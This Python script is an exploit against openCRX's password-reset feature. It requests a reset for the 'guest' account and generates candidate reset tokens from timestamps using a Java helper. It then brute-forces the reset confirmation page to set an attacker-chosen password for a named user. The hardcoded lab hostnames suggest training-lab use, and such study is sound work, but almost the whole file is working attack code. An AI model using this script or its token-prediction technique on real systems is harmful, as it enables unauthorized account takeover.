#!/usr/bin/env python3
import requests
# date +%s%3N && curl -s -i -X 'POST' --data-binary 'username=anonymous' 'http://answers/generateMagicLink' && date +%s%3N
import os
import time
import argparse
from rich.console import Console
from rich.progress import Progress
from rich import print
import re
import subprocess

console = Console()
#
parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

forgot_payload = {
    'id': 'guest'
    }
forgot_url = f"http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
start_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
time.sleep(1)
console.log(f"[yellow][+] Start Time Stamp is: {start_time_stamp.stdout.decode().rstrip()}")
res = requests.post(url = forgot_url, data = forgot_payload)
if res.status_code == 200 and 'Unable to request password reset' in res.text:
    console.log(f"[bold red][-] Look's like guest is not present on the openCRX installation")
    sys.exit(0)
else:
    time.sleep(1)
    response_header_date = res.headers["Date"]
    stop_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
    console.log(f"[yellow][+] Stop Time Stamp is: {stop_time_stamp.stdout.decode().rstrip()}")
    console.log(f"[bold green][+] guest user found!! Proceeding with further exploitation...")
    console.log(f"[yellow][+] Producing Time Stamp List...")
    compile_java = subprocess.run(r"javac MagicTokenGenerator.java", shell = True, capture_output = True)
    if compile_java.returncode == 0:
        run_java = subprocess.run(f"java MagicTokenGenerator {start_time_stamp.stdout.decode().rstrip()} {stop_time_stamp.stdout.decode().rstrip()} > time_stamps", shell = True, capture_output = True)
        #run_java = subprocess.run(f"java MagicTokenGenerator {start_time_stamp.stdout.decode().rstrip()} {stop_time_stamp.stdout.decode().rstrip()}", shell = True, capture_output = True)
        if run_java.returncode == 0:
            console.log(f"[yellow][+] Time Stamp List produced successfully and it is stored in the [bold]time_stamps[/bold] file")
#start = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
#start = int(time.time()*1000)-500
#print(start)
#time.sleep(1)
#
#data = b"id=guest"
#os.system("curl -x http://127.0.0.1:8080 -s -i -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp'")
#os.system("curl -x http://127.0.0.1:8080 -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp'")
#r = requests.post(url="http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp",data=data, proxies=proxies)
#print (r.headers)
#end = int(time.time()*1000)+500
#time.sleep(1)
#end = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
#
#print(end)
#os.system(f"java MagicTokenGenerator {start.stdout.decode().rstrip()} {end.stdout.decode().rstrip()} > tokens.txt")
#os.system(f"java MagicTokenGenerator {start} {end} > time_stamps")
##os.system(f"java MagicTokenGenerator {start} {end}")
#time.sleep(2)
## fuzz token

#with open("tokens.txt", "r") as f:
with open("time_stamps", "r") as f:
    print("Fuzzing token")
    for word in f:
        token = word.strip()
        # print(token)
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target,proxies=proxies, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break


os.system("rm tokens.txt")
